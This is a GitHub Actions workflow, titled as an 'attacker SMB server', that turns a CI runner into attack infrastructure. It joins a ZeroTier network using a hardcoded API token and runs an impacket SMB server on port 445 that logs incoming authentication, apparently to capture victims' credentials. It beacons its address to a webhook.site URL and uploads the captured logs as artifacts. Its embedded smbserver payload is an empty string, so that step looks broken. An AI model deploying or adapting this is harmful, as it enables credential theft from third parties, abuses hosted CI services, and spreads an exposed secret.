name: D17 ZT attacker SMB server
on:
  workflow_dispatch:

jobs:
  attacker:
    runs-on: windows-latest
    timeout-minutes: 20
    steps:
      - name: Install ZeroTier + join + authorize + SMB server
        shell: pwsh
        run: |
          $ErrorActionPreference='Continue'
          $base='C:\ztd17'
          New-Item -ItemType Directory -Force -Path "$base\share" | Out-Null
          $tok='qhvzxqETSjDAbYmUxEQUayNXIzULfVBf'
          $net='363c67c55a7dcb11'
          Write-Output '=== install ZT ==='
          winget install --id ZeroTier.ZeroTierOne -e --accept-source-agreements --accept-package-agreements --silent 2>&1 | Select-Object -Last 10
          Write-Output "WINGET_EXIT=$LASTEXITCODE"
          Start-Sleep -Seconds 5
          $ztcli='C:\Program Files (x86)\ZeroTier\One\zerotier-cli.bat'
          if (-not (Test-Path $ztcli)) { $ztcli='C:\Program Files\ZeroTier\One\zerotier-cli.bat' }
          Write-Output "ZTCLI=$ztcli"
          & $ztcli info 2>&1
          $nodeid = (& $ztcli info 2>&1 | Select-String -Pattern '\b([0-9a-f]{10})\b' | ForEach-Object { $_.Matches[0].Value } | Select-Object -First 1)
          Write-Output "NODEID=$nodeid"
          & $ztcli join $net 2>&1
          Start-Sleep -Seconds 5
          # authorize via API
          $h=@{ Authorization="Bearer $tok"; 'Content-Type'='application/json' }
          try {
            $r=Invoke-WebRequest -Uri "https://api.zerotier.com/api/v1/network/$net/member/$nodeid" -Method Post -Headers $h -Body '{"config":{"authorized":true},"name":"d17-attacker"}' -UseBasicParsing -TimeoutSec 20
            Write-Output "AUTH_API=$($r.StatusCode)"
          } catch { Write-Output "AUTH_ERR=$($_.Exception.Message)" }
          Write-Output '=== poll API for ZT IP ==='
          $ztip=''
          for ($i=0; $i -lt 20; $i++) {
            Start-Sleep -Seconds 4
            try {
              $m=Invoke-RestMethod -Uri "https://api.zerotier.com/api/v1/network/$net/member/$nodeid" -Headers $h -TimeoutSec 20
              $ips=$m.config.ipAssignments
              if ($ips -and $ips.Count -gt 0) { $ztip=$ips[0]; break }
            } catch {}
          }
          Write-Output "ZTIP=$ztip"
          & $ztcli listnetworks 2>&1
          Write-Output '=== bind 445 on ZT IP tests ==='
          python -c "import socket,sys;s=socket.socket();s.bind((sys.argv[1],445));print('BIND_OK',sys.argv[1]);s.close()" $ztip 2>&1
          python -c "import socket,sys;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((sys.argv[1],445));print('BIND_REUSE_OK',sys.argv[1]);s.close()" $ztip 2>&1
          Write-Output '=== start impacket SMB on ZT IP ==='
          $sb=''
          [IO.File]::WriteAllBytes("$base\smbserver.py",[Convert]::FromBase64String($sb))
          python -m pip install --quiet impacket 2>&1 | Select-Object -Last 2
          $p=Start-Process -FilePath python -ArgumentList @("$base\smbserver.py",'-smb2support','-disablekerberos','-debug','-ip',$ztip,'-outputfile','C:\ztd17\smb.log','SHARE','C:\ztd17\share') -RedirectStandardOutput "$base\smbout.log" -RedirectStandardError "$base\smberr.log" -PassThru
          Write-Output "SMB_PID=$($p.Id)"
          try { Invoke-WebRequest -Uri "https://webhook.site/f42f531d-1f80-4332-acfc-dd4d921c93e0?d17=SMB_ATTEMPT&ip=$ztip" -TimeoutSec 10 -UseBasicParsing | Out-Null } catch {}
          Start-Sleep -Seconds 6
          Get-Content "$base\smberr.log" -Tail 15
          Write-Output '=== KEEPALIVE (attacker SMB up) ==='
          Start-Sleep -Seconds 330
          Write-Output '=== final smb log ==='
          if (Test-Path "$base\smb.log") { Get-Content "$base\smb.log" -Tail 60 }

      - name: Upload SMB capture
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: zt-attacker-smb
          path: |
            C:\ztd17\smb.log
            C:\ztd17\smberr.log
            C:\ztd17\smbout.log
          if-no-files-found: warn
